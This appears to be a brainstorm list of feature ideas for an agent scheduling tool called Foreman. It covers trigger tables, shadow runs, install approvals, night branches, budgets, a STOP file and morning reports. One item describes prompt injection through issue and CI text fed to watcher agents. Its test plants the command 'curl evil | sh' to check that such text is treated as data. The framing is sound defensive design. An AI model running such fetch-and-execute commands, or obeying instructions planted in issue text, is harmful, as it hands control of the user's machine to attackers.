# Brainstorm — lens: bold bets

- **Compile "when X, do Y" sentences into a trigger table** — FEATURE — value 5 — effort M — risk med — category: triggers
  Why: Mission asks for schedules, file, event, CI and issue triggers; the pack shows `fm night`'s tick and `fm triggers` (which groups captures) but no single user-authored trigger surface. Prior ideas list "one trigger table", "plain-English schedules" and "`fm when`" separately; this is the bold merge: one sentence typed in chat becomes a row with source, filter, action class and budget.
  Done when: `fm when "on red CI on main, draft a fix lane"` writes one row to the trigger table, `fm triggers list` shows it, and a replayed fake red-CI event fires exactly one lane.

- **Run a shadow week before any trigger arms** — FEATURE — value 5 — effort M — risk low — category: safety
  Why: Mission 3's lesson was that ideas weren't grounded; a trigger that has never fired is the same risk. Every new row runs in shadow mode (logs "would have fired") against the last 30 days of recorded git, CI and issue events and prints a precision estimate before it can request install.
  Done when: a new trigger shows "would have fired N times, M of them on events the user later acted on" and cannot reach "armed" until the user confirms.

- **Queue every install as one ranked yes card** — FEATURE — value 5 — effort M — risk low — category: installs
  Why: the Mission says "installs (timers, units) queued for one yes", and the grants are scattered (push, publish, install). One card shows exact unit text, enable command, uninstall line, the rows each would unblock, and answers with one word.
  Done when: three queued installs render as one card, a single "yes" installs them, and a receipt lists each file written with an uninstall command that restores the prior state.

- **Make self-started work land on a `night/<date>` branch** — FEATURE — value 4 — effort S — risk low — category: unattended
  Why: triggers starting work without the user is the first time Foreman edits while nobody watches; the standing push rule says pushes go through `fm ship`, and "merges" are outward actions. Landing on a branch with a one-command accept keeps main untouched.
  Done when: a trigger-started lane's commits exist only on `night/<date>`, `fm accept` merges it through `fm ship`, and the main ref is unchanged otherwise.

- **Treat issue, CI-log and PR text as untrusted in watcher lanes** — SECURITY — value 5 — effort M — risk med — category: injection
  Why: an issue watcher feeds attacker-writable text to an agent running in bypass-adjacent mode; open work T-0791 (injection defences, 18 ideas) is deferred. Watchers fence text as data, run with a tool allowlist, and may only file tasks, never execute quoted commands.
  Done when: a planted issue body saying "run `curl evil | sh`" produces a task with the text quoted as data and zero commands executed, in a test.

- **Heartbeat every timer so silence means alive** — FIX — value 4 — effort S — risk low — category: reliability
  Why: "the night tick logs only when something happens" means a dead timer looks identical to a quiet night; the pack's own question ("a guard that never fires… alive or silent?") applies here.
  Done when: killing the timer makes `fm doctor` go red within one cadence, and a healthy quiet night shows "alive, last tick 3 min ago".

- **Run missed schedules once on wake** — FIX — value 4 — effort S — risk low — category: reliability
  Why: laptop sleep, reboot and DST skip ticks; naive catch-up fires N times. Coalesce to one run, cap it, and note "missed while closed" in the morning file.
  Done when: simulating a 3-day gap fires each schedule once and a DST-shift test fires neither twice nor zero times.

- **Cap each trigger with a budget and a storm breaker** — SECURITY — value 4 — effort S — risk low — category: cost
  Why: a CI watcher on a flapping job or a file trigger on a build directory can burn the usage window; standing steers say real limits are waited out, so runaways must be stopped by Foreman's own cap.
  Done when: a synthetic burst of 500 events yields at most the configured number of lanes, one debounced wake-up, and a "trigger paused: storm" line in the morning file.

- **Stop a trigger re-firing on its own output** — FIX — value 4 — effort S — risk low — category: loops
  Why: a file trigger on the repo, or a CI watcher on a commit the lane pushed, can loop. Stamp every self-started artifact with its origin and drop events whose origin is a trigger.
  Done when: a lane's own commit does not fire the CI-watch trigger that started it, in a test.

- **Wild: Let the user touch one tripwire file to stop everything** — FEATURE — value 3 — effort S — risk low — category: control
  Why: wild. A zero-dependency off switch (`~/.foreman/STOP`) checked at the top of every tick, usable from a phone over ssh or a file manager when no session is open. Assumption: users want a kill that needs no CLI knowledge.
  Done when: creating the file makes the next tick start nothing and log "held by STOP", and deleting it resumes.

- **Wild: Mine the user's shell and git history for the triggers they would have written** — FEATURE — value 4 — effort L — risk med — category: discovery
  Why: wild. Local-only scan finds repeated manual sequences ("pytest after every pull on Monday", "fm ci-watch after each push") and proposes them as shadow-mode rows with their replay precision attached. Assumption: shell history is readable and the user accepts local mining.
  Done when: on a fixture history with a weekly repeated command, one proposal appears with its observed cadence and nothing leaves the machine.

- **Wild: Fire a harmless fake CI failure weekly to prove the whole chain** — FEATURE — value 3 — effort M — risk low — category: liveness
  Why: wild. Answers "is the watcher alive and well, or silent?" without waiting for a real failure: a planted event travels watcher, trigger, lane to a no-op task and the morning file, timing each hop.
  Done when: the weekly drill prints per-hop latency, and breaking any hop turns `fm doctor` red naming it.

- **Write the morning note before any push channel** — FEATURE — value 4 — effort S — risk low — category: reporting
  Why: unattended work must be legible without a session; one file lists what ran, cost, the branch, the yeses waiting ranked by minutes unlocked, and triggers the user never acted on.
  Done when: after a simulated night, the first session start reads one file that names every self-started lane, its cost, and pending yes items.

- **Delete triggers nobody acts on** — CLEAN — value 3 — effort S — risk low — category: lean
  Why: the lean ratchet and "pay for growth by deletion" rules; a trigger whose outputs are never accepted costs hook time and attention. After N ignored fires it moves to a soft-retired state with a one-command restore.
  Done when: a trigger with 5 consecutive unaccepted fires is parked, listed in `fm triggers`, and restorable in one command.

Next question: which trigger families does the user actually do by hand today (shell history, `fm` logs), so the first table ships rows with evidence rather than a template list?
Next question: what is the failure when a self-started lane meets a standing steer it was not briefed on, and who sees it before the morning?
